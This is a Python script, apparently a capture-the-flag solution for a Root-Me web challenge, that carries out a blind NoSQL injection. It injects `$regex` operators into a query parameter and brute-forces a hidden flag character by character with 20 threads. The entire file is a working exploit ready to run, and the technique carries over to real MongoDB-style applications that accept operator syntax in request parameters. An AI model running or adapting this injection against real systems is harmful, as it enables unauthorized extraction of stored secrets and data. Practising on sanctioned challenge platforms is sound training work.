import requests
import re
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://challenge01.root-me.org/web-serveur/ch48/"
# charset = sorted(string.ascii_letters + string.digits + " _{}-(),~")
charset = string.printable
true_cond = "Yeah"
max_len = 50  # maximum possible length
max_workers = 20  # threads for guessing each character

session = requests.Session()


def escape_and_encode(s):
    # Escape regex special characters so they match literally
    regex_escaped = re.escape(s)
    # URL encode everything
    return requests.utils.quote(regex_escaped, safe='')

def check_condition(flag_so_far, ch):
    escaped_part = escape_and_encode(flag_so_far + ch)
    payload = f"?chall_name=nosqlblind&flag[$regex]=^{escaped_part}"
    try:
        r = session.get(url + payload, timeout=5)
        # print(f"url: {url + payload}")
        return true_cond in r.text
    except requests.RequestException:
        return False

def extract():
    flag = ''
    print("[i] Starting extraction...")

    for pos in range(1, max_len + 1):
        found_char = None

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(check_condition, flag, ch): ch for ch in charset}

            for future in as_completed(futures):
                ch = futures[future]
                if future.result():
                    found_char = ch
                    break  # found correct char → stop checking others

        if found_char:
            flag += found_char
            print(f"[+] Position {pos}: {found_char} → {requests.utils.unquote(flag)}")
        else:
            print(f"[-] No match at position {pos}, stopping.")
            break

    print(f"\n[+] Extraction complete:\n{requests.utils.unquote(flag)}")
    return flag

if __name__ == "__main__":
    extract()
